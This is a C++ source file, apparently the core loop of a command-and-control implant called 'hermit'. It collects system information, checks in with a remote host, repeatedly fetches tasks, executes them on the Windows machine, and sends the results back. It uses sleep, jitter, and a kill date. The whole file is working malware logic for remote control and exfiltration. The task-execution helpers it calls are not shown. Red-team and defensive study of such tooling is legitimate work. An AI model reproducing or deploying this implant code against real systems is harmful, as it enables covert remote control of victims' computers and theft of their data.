#include "hermit.hpp"

BOOL Run(
	HINSTANCE       hInstance,
	INT 			nCmdShow,
	LPCWSTR 		lpHost,
	INTERNET_PORT 	nPort,
	LPCWSTR 		lpRequestCheckInPath,
    LPCWSTR 		lpRequestTaskGetPath,
    LPCWSTR 		lpRequestTaskResultPath,
	INT 			nSleep,
	INT				nJitter,
	INT				nKillDate
) {
	BOOL bResults = FALSE;

	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
    BOOL bCheckIn = FALSE;
	BOOL bQuit = FALSE;

	// Get initial system info for sending it when check-in
	std::wstring infoJson = GetInitialInfo();

	WinHttpHandlers handlers = InitRequest(
		lpHost,
		nPort
	);
	if (!handlers.hSession || !handlers.hConnect) {
		WinHttpCloseHandles(hSession, hConnect, hRequest);
		return FALSE;
	}

	hSession = handlers.hSession;
	hConnect = handlers.hConnect;

	// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

    // Check in
    do
    {
        SLEEP(nSleep);

        bCheckIn = CheckIn(
			hConnect,
			lpHost,
			nPort,
			lpRequestCheckInPath,
			infoJson
		);
    } while (!bCheckIn);

	// Get and execute tasks
	do
	{
		SLEEP(nSleep);

		std::wstring task = GetTask(
			hConnect,
			lpHost,
			nPort,
			lpRequestTaskGetPath
		);

		std::wstring taskResult = ExecuteTask(
			hInstance,
			nCmdShow,
			hConnect,
			task,
			nSleep
		);
		if (wcscmp(taskResult.c_str(), L"") == 0)
		{
			continue;
		}

		bResults = SendTaskResult(
			hConnect,
			lpHost,
			nPort,
			lpRequestTaskResultPath,
			task,
			taskResult
		);
		if (!bResults) {
			continue;
		}
	} while (bQuit == FALSE);

	WinHttpCloseHandles(hSession, hConnect, hRequest);
	return TRUE;
}
